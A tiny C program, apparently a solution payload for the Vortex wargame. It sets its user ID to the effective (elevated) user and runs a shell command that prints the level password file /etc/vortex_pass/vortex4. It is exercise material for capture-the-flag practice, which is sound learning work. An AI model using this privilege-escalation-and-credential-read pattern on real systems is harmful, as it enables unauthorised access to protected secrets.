#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {	
	setuid(geteuid());
	system("cat /etc/vortex_pass/vortex4");
	return 0;
}	
